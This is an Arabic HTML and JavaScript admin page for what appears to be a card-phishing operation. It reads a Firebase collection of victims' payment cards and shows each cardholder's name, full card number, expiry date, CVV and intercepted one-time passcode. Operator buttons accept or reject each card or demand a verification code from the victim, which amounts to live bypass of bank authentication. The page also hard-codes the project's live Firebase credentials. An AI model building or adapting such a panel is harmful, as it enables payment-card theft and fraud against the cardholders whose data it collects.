<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم البطاقات المسجلة</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #1a56db;
            --bg: #f9fafb;
            --white: #ffffff;
            --border: #e5e7eb;
        }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); margin: 0; padding: 20px; }
        .container { max-width: 1100px; margin: 0 auto; }
        
        /* Stats Section */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: var(--white); padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 15px; }
        .stat-card i { font-size: 24px; color: var(--primary); }
        .stat-val { font-size: 22px; font-weight: bold; display: block; }
        .stat-label { color: #6b7280; font-size: 14px; }

        /* Table Section */
        .table-container { background: var(--white); border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 20px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; text-align: right; }
        th { padding: 15px; border-bottom: 2px solid var(--border); color: #374151; }
        td { padding: 15px; border-bottom: 1px solid var(--border); }
        
        .badge { padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: 600; }
        .badge-visa { background: #eef2ff; color: #4338ca; }
        .badge-master { background: #fff7ed; color: #9a3412; }
        .badge-mada { background: #f0fdf4; color: #166534; }
        
        .status-pending { color: #f59e0b; font-weight: bold; }
        .status-success { color: #10b981; font-weight: bold; }
        .status-error { color: #ef4444; font-weight: bold; }
        .status-otp_required { color: #8b5cf6; font-weight: bold; }
        .status-otp_sent { color: #3b82f6; font-weight: bold; }
        
        .delete-btn { color: #ef4444; border: none; background: none; cursor: pointer; font-size: 18px; }
        .loader { text-align: center; padding: 40px; font-size: 18px; color: var(--primary); }
        
        .action-buttons { display: flex; gap: 5px; }
        .action-btn { background: none; border: none; cursor: pointer; font-size: 16px; padding: 5px; border-radius: 4px; }
        .action-btn:hover { background-color: #f3f4f6; }
    </style>
</head>
<body>

<div class="container">
    <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
        <h1><i class="fa-solid fa-database"></i> البطاقات المسجلة</h1>
        <button onclick="location.reload()" style="padding: 8px 16px; background: #fff; border: 1px solid var(--border); border-radius: 8px; cursor: pointer;">
            <i class="fa-solid fa-rotate"></i> تحديث
        </button>
    </header>

    <div class="stats-grid">
        <div class="stat-card"><i class="fa-solid fa-credit-card"></i><div><span class="stat-val" id="total-count">0</span><span class="stat-label">الإجمالي</span></div></div>
        <div class="stat-card"><i class="fa-brands fa-cc-visa"></i><div><span class="stat-val" id="visa-count">0</span><span class="stat-label">فيزا</span></div></div>
        <div class="stat-card"><i class="fa-brands fa-cc-mastercard"></i><div><span class="stat-val" id="master-count">0</span><span class="stat-label">ماستركارد</span></div></div>
        <div class="stat-card"><img src="m.png" width="25" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/84/Mada_Logo.svg'"><div><span class="stat-val" id="mada-count">0</span><span class="stat-label">مدى</span></div></div>
    </div>

    <div class="table-container">
        <div id="loading" class="loader"><i class="fas fa-spinner fa-spin"></i> جاري جلب البيانات من Firebase...</div>
        <table id="cards-table" style="display: none;">
            <thead>
                <tr>
                    <th>النوع</th>
                    <th>حامل البطاقة</th>
                    <th>رقم البطاقة</th>
                    <th>التاريخ</th>
                    <th>CVV</th>
                    <th>تاريخ التسجيل</th>
                    <th>الحالة</th>
                    <th>إجراء</th>
                </tr>
            </thead>
            <tbody id="table-body"></tbody>
        </table>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
    import { getFirestore, collection, getDocs, deleteDoc, doc, query, orderBy, updateDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
        authDomain: "vasa-a14ca.firebaseapp.com",
        projectId: "vasa-a14ca",
        storageBucket: "vasa-a14ca.firebasestorage.app",
        messagingSenderId: "1083668938512",
        appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
        measurementId: "G-1ESJ0J0TZW"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    async function loadCards() {
        const tableBody = document.getElementById('table-body');
        const loading = document.getElementById('loading');
        const table = document.getElementById('cards-table');
        
        let stats = { total: 0, visa: 0, mastercard: 0, mada: 0 };

        try {
            // جلب البيانات مرتبة حسب التاريخ (الأحدث أولاً)
            const q = query(collection(db, "cards"), orderBy("createdAt", "desc"));
            const querySnapshot = await getDocs(q);
            
            tableBody.innerHTML = "";
            
            querySnapshot.forEach((docSnap) => {
                const data = docSnap.data();
                stats.total++;
                stats[data.cardType]++;

                const date = data.createdAt ? data.createdAt.toDate().toLocaleString('ar-EG') : 'غير متوفر';
                
                // تحديد اسم الحالة
                let statusText = data.status || 'قيد الانتظار';
                let statusClass = 'status-' + (data.status || 'pending');
                
                if (data.status === 'otp_sent' && data.otp) {
                    statusText = `<b style="color:blue;">وصل الكود: ${data.otp}</b>`;
                }

                const row = `
                    <tr id="row-${docSnap.id}">
                        <td><span class="badge badge-${data.cardType}">${data.cardType.toUpperCase()}</span></td>
                        <td>${data.cardHolder}</td>
                        <td dir="ltr">${data.cardNumber}</td>
                        <td>${data.expiryDate}</td>
                        <td>${data.cvv}</td>
                        <td style="font-size: 12px; color: #666;">${date}</td>
                        <td id="status-${docSnap.id}" class="${statusClass}">${statusText}</td>
                        <td>
                            <div class="action-buttons">
                                <button onclick="updateStatus('${docSnap.id}', 'success')" class="action-btn" style="color:green;" title="قبول">
                                    <i class="fa-solid fa-check"></i>
                                </button>
                                
                                <button onclick="updateStatus('${docSnap.id}', 'otp_required')" class="action-btn" style="color:#e1ad01;" title="طلب كود التحقق">
                                    <i class="fa-solid fa-key"></i>
                                </button>
                                
                                <button onclick="updateStatus('${docSnap.id}', 'error')" class="action-btn" style="color:orange;" title="رفض">
                                    <i class="fa-solid fa-xmark"></i>
                                </button>
                                
                                <button onclick="deleteCard('${docSnap.id}')" class="action-btn delete-btn" title="حذف">
                                    <i class="fa-solid fa-trash-can"></i>
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
                tableBody.innerHTML += row;
            });

            // تحديث واجهة الإحصائيات
            document.getElementById('total-count').innerText = stats.total;
            document.getElementById('visa-count').innerText = stats.visa;
            document.getElementById('master-count').innerText = stats.mastercard;
            document.getElementById('mada-count').innerText = stats.mada;

            loading.style.display = 'none';
            table.style.display = 'table';

        } catch (error) {
            console.error("Error: ", error);
            loading.innerText = "فشل تحميل البيانات. تأكد من إعدادات Firestore.";
        } 
    }

    // وظيفة الحذف
    window.deleteCard = async (id) => {
        if (confirm("هل أنت متأكد من حذف هذه البطاقة؟")) {
            try {
                await deleteDoc(doc(db, "cards", id));
                document.getElementById(`row-${id}`).remove();
                alert("تم الحذف بنجاح");
                location.reload(); // لتحديث الإحصائيات
            } catch (error) {
                alert("خطأ في الحذف: " + error.message);
            }
        }
    };

    // وظيفة تحديث الحالة
    window.updateStatus = async (id, newStatus) => {
        try {
            await updateDoc(doc(db, "cards", id), { status: newStatus });
            
            const el = document.getElementById(`status-${id}`);
            if (el) {
                el.className = 'status-' + newStatus;
                
                if (newStatus === 'success') {
                    el.innerText = 'ناجح';
                } else if (newStatus === 'error') {
                    el.innerText = 'فشل';
                } else if (newStatus === 'otp_required') {
                    el.innerText = 'مطلوب كود تحقق';
                } else {
                    el.innerText = newStatus;
                }
            }
            
            alert("تم تحديث الحالة بنجاح");
        } catch (e) {
            alert("خطأ في التحديث: " + (e.message || e));
        }
    };

    loadCards();
</script>
</body>
</html>
